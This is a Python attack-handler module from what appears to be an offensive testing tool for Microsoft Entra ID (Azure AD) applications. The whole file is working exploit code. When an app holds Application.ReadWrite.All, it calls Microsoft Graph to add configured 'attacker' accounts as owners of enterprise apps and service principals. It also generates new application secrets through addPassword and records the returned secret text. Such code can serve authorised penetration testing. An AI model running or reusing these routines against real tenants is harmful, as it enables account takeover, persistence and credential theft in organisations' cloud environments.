from attacks.handlers.base_handler import AttackHandler,Request,Response
from typing import List
from utils import logger
import requests

logger = logger.createLogger('attacks.handlers.application_rw_directory_r_handler')


class ApplicationRWDirectoryR_Handler(AttackHandler):

    def handle(self, request: Request,responses:List[Response]): 

        if "Application.ReadWrite.All" in request.roles and "Directory.Read.All" in request.roles:
                logger.info('tid: %s, appid: %s may be vulnerable to application_rw_directory_r vector' % (request.tenantId,request.appId))
                logger.debug('Attack vector - change owner of enterprise app.')
                conf = request.attack_config['ApplicationReadWriteAll']
                status = False
                attack_name = "ApplicationRWDirectoryRVectors1"
                message = ""
                error = "ApplicationRWDirectoryRVectors1 - failed"
                try:
                    for sp in conf['addOwnerToEA']:
                        create_message_URL = "https://graph.microsoft.com/v1.0/servicePrincipals/" + sp + "/owners/$ref"
                        for attacker in conf['attacker']:
                            message_obj = {
                                "@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/" + attacker
                            }

                            result = requests.post(create_message_URL, json=message_obj, headers=request.request_headers)
                            text = result.text

                            if result.status_code == 204:
                                create_message_URL = "https://graph.microsoft.com/v1.0/servicePrincipals/" + sp
                                result = requests.get(create_message_URL, headers=request.request_headers)
                                res = result.json()
                                status = True
                                message += "Added attacker: %s to: %s (enterprise app)\n" % (attacker, res['appDisplayName'])
                    
                    if message == "":
                        message = error
                              
                except:
                    logger.error("Unexpected exception in ApplicationRWDirectoryR_Handler function")
                
                responses.append(Response(attack_name,request.tenantId,request.appId,status,message))

                logger.info('tid: %s, appid: %s may be vulnerable to application_rw_directory_r vector' % (request.tenantId,request.appId))
                logger.debug('Attack vector - change owner of enterprise app.')
                conf = request.attack_config['ApplicationReadWriteAll']
                status = False
                attack_name = "ApplicationRWDirectoryRVectors2"
                message = ""
                error = "ApplicationRWDirectoryRVectors2 - failed"
                try:
                    for sp in conf['addOwnerToSP']:
                        create_message_URL = "https://graph.microsoft.com/v1.0/applications/" + sp + "/owners/$ref"
                        for attacker in conf['attacker']:
                            message_obj = {
                                "@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/" + attacker
                            }

                            result = requests.post(create_message_URL, json=message_obj, headers=request.request_headers)
                            if result.status_code == 204:
                                create_message_URL = "https://graph.microsoft.com/v1.0/applications/" + sp
                                result = requests.get(create_message_URL, headers=request.request_headers)
                                res = result.json()
                                status = True
                                message += "Added attacker: %s to: %s (service principals)\n" % (attacker, res['displayName'])
                    
                    if message == "":
                        message = error
                except:
                    logger.error("Unexpected exception in ApplicationRWDirectoryR_Handler function")
                
                responses.append(Response(attack_name,request.tenantId,request.appId,status,message))

        if "Application.ReadWrite.All" in request.roles:
            logger.info('tid: %s, appid: %s may be vulnerable to application_rw vector' % (request.tenantId,request.appId))
            conf = request.attack_config['ApplicationReadWriteAll']
            status = False
            attack_name = "ApplicationRWVectors"
            message = ""
            error = "ApplicationRWVectors - failed"
            logger.debug("Application.ReadWrite.All - Allows the app to read all applications and service principals without a "
            "signed-in user.")
            logger.debug("Attack vector - create a new app's secret.")
            logger.debug("Pay attention that it may not appear in the gui (it may take some time), but you will still be able to use "
                "it with the creds of SP's object id:secret")
            
            logger.info("Try running Application.ReadWrite.All on vector: create a new app's secret.")
            try:
                for sp in conf['sp']:
                    create_message_URL = "https://graph.microsoft.com/v1.0/applications/" + sp + "/addPassword"

                    message_obj = {"passwordCredential": {"displayName": conf["dn"]}}

                    res = requests.post(create_message_URL, json=message_obj, headers=request.request_headers)
                    text = res.json()
                    if res.status_code == 200:
                        status = True
                        secret = text['secretText']
                        message += "Got secret: %s from sp: %s\n" % (secret, sp)

                if message == "":
                    message = error
            except:
                logger.error("Unexpected exception in ApplicationRWDirectoryR_Handler function")
            
            responses.append(Response(attack_name,request.tenantId,request.appId,status,message))

        return super().handle(request,responses)



